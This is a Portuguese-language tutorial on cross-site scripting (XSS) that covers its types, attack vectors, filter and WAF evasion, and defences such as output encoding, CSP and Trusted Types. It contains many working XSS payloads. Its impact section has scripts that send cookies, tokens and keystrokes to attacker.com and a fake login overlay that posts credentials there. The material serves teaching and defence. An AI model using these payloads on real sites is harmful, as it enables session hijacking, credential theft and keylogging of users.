# XSS - Cross-Site Scripting

XSS é uma vulnerabilidade que permite a atacantes injetar scripts maliciosos em páginas web visualizadas por outros usuários. O código malicioso executa no contexto do navegador da vítima, permitindo roubo de dados, sequestro de sessões e manipulação de conteúdo.

## Tipos de XSS

### **1. Reflected XSS (Não Persistente)**
- Payload refletido imediatamente na resposta
- Requer interação da vítima (clicar em link malicioso)
- Mais comum em parâmetros de URL e formulários

```html
<!-- URL maliciosa -->
https://vulnerable-site.com/search?q=<script>alert('XSS')</script>

<!-- Resposta da aplicação -->
<p>Resultados para: <script>alert('XSS')</script></p>
```

### **2. Stored XSS (Persistente)**
- Payload armazenado no servidor (banco de dados, arquivos)
- Executa automaticamente para todos os usuários que acessam a página
- Mais perigoso devido à persistência

```html
<!-- Comentário malicioso salvo no banco -->
<div class="comment">
    <script>
        fetch('/api/user', {credentials: 'include'})
        .then(r => r.json())
        .then(data => fetch('//attacker.com/steal?data=' + btoa(JSON.stringify(data))))
    </script>
</div>
```

### **3. DOM-based XSS**
- Manipulação do DOM pelo JavaScript no lado cliente
- Payload nunca enviado ao servidor
- Ocorre inteiramente no navegador

```javascript
// Código vulnerável
let search = location.search.substring(1);
document.getElementById('results').innerHTML = "Buscando por: " + search;

// URL maliciosa
https://site.com/search.html?<img src=x onerror=alert('XSS')>
```

## Vetores de Ataque Comuns

### **Tags HTML Maliciosas**
```html
<!-- Script básico -->
<script>alert('XSS')</script>

<!-- Eventos de imagem -->
<img src=x onerror="alert('XSS')">
<img src="javascript:alert('XSS')">

<!-- Eventos de formulário -->
<input type="text" onfocus="alert('XSS')" autofocus>
<textarea onmouseover="alert('XSS')">Texto</textarea>

<!-- SVG vectors -->
<svg onload="alert('XSS')">
<svg><script>alert('XSS')</script></svg>

<!-- Body events -->
<body onload="alert('XSS')">
<body onpageshow="alert('XSS')">
```

### **Técnicas de Evasão de Filtros**
```html
<!-- Encoding de caracteres -->
<script>alert('XSS')</script>
<script>alert(&#39;XSS&#39;)</script>
<script>alert(\u0027XSS\u0027)</script>

<!-- Case variation -->
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>

<!-- Quebra de tags -->
<img src="x" onerror="al
ert('XSS')">

<!-- Null bytes -->
<img src=x%00 onerror="alert('XSS')">

<!-- Protocol handlers -->
<a href="javascript:alert('XSS')">Click</a>
<a href="data:text/html,<script>alert('XSS')</script>">Click</a>
```

### **Bypass WAF (Web Application Firewall)**
```html
<!-- Encoding alternativo -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">

<!-- String obfuscation -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>

<!-- Template literals -->
<script>`${alert`XSS`}`</script>

<!-- Comments injection -->
<img src="x" onerror="alert('XSS'/*comment*/)">
```

## Impactos do XSS

### **Roubo de Dados Sensíveis**
```javascript
// Roubo de cookies
document.location='//attacker.com/steal?cookie='+document.cookie;

// Roubo de tokens
fetch('/api/token').then(r=>r.text()).then(token=>
    fetch('//attacker.com/steal?token='+token)
);

// Keylogger
document.onkeypress = function(e) {
    fetch('//attacker.com/keys?key=' + String.fromCharCode(e.which));
};
```

### **Sequestro de Sessão**
```javascript
// Session hijacking
let sessionId = document.cookie.match(/JSESSIONID=([^;]+)/)[1];
fetch('//attacker.com/hijack?session=' + sessionId);
```

### **Phishing e Manipulação de Conteúdo**
```javascript
// Mudança de conteúdo da página
document.body.innerHTML = '<div style="text-align:center"><h1>Login Expirado</h1><form action="//attacker.com/phish"><input name="user" placeholder="Usuário"><input name="pass" type="password" placeholder="Senha"><button>Login</button></form></div>';
```

## Prevenção e Defesas

### **1. Input Validation e Sanitização**
```javascript
// Validação de entrada
function sanitizeInput(input) {
    return input.replace(/[<>\"']/g, function(match) {
        const map = {
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#39;'
        };
        return map[match];
    });
}
```

### **2. Output Encoding**
```html
<!-- HTML Encoding -->
<%: userInput %> <!-- ASP.NET -->
{{ userInput|escape }} <!-- Django -->
{{{ userInput }}} <!-- Handlebars auto-escape -->

<!-- JavaScript Encoding -->
var userData = '<%: JavaScriptEncode(userInput) %>';
```

### **3. Content Security Policy (CSP)**
```html
<!-- CSP Headers restritivos -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' 'nonce-abc123'; 
               style-src 'self' 'unsafe-inline'; 
               img-src 'self' data: https:;">

<!-- Nonce para scripts legítimos -->
<script nonce="abc123">
    console.log('Script permitido');
</script>
```

### **4. HTTPOnly e Secure Cookies**
```http
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

### **5. Validação de Referrer e Origin**
```javascript
// Verificação de origem
if (document.referrer && !document.referrer.startsWith('https://trusted-domain.com')) {
    console.warn('Possível XSS via referrer');
}
```

## Ferramentas e Testes

### **Payloads de Teste**
```html
<!-- Teste básico -->
<script>alert('XSS')</script>

<!-- Polyglot (múltiplos contextos) -->
javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>

<!-- Teste em atributos -->
" onmouseover="alert('XSS') 
' onfocus='alert(XSS)' autofocus='

<!-- Teste em URLs -->
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>
```

### **Ferramentas Automatizadas**
- **XSStrike**: Scanner XSS avançado
- **Burp Suite**: Extensões XSS
- **OWASP ZAP**: Scanner de vulnerabilidades
- **Browser Developer Tools**: Teste manual

## Defesas Modernas

### **Trusted Types API**
```javascript
// Prevenção de DOM XSS
const policy = trustedTypes.createPolicy('myPolicy', {
    createHTML: (string) => {
        return DOMPurify.sanitize(string);
    }
});

element.innerHTML = policy.createHTML(userInput);
```

### **SameSite Cookies**
```http
Set-Cookie: session=abc123; SameSite=Strict
Set-Cookie: csrf=def456; SameSite=Lax
```

### **Subresource Integrity (SRI)**
```html
<script src="https://cdn.example.com/library.js" 
        integrity="sha384-abc123def456..." 
        crossorigin="anonymous"></script>
```

## Melhores Práticas

1. **Nunca confiar em dados do usuário**
2. **Sempre sanitizar/validar inputs**
3. **Usar encoding apropriado para o contexto**
4. **Implementar CSP restritivo**
5. **Manter bibliotecas atualizadas**
6. **Usar HTTPOnly cookies**
7. **Implementar logging de tentativas XSS**
8. **Educar desenvolvedores sobre XSS**
9. **Realizar testes regulares de segurança**
10. **Usar frameworks com proteção XSS integrada**

## Conclusão

XSS continua sendo uma das vulnerabilidades mais prevalentes e perigosas em aplicações web. A prevenção efetiva requer uma abordagem em camadas, combinando validação rigorosa de entrada, encoding adequado de saída, políticas de segurança de conteúdo e conscientização da equipe de desenvolvimento sobre as melhores práticas de segurança.


SOURCE
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html